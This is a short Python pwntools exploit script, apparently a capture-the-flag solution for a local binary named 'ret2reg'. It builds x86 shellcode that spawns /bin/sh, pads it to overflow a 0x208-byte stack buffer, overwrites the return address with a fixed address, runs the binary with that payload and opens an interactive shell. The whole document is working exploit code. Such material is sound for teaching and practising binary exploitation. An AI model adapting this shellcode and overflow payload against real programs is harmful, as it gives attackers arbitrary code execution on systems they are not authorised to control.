from pwn import *

shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
retaddr = p32(0x0804901d)

payload = shellcode + b'a'*(0x208+4-len(shellcode)) + retaddr

sh = process(argv=[ "./ret2reg",payload])
sh.interactive()   
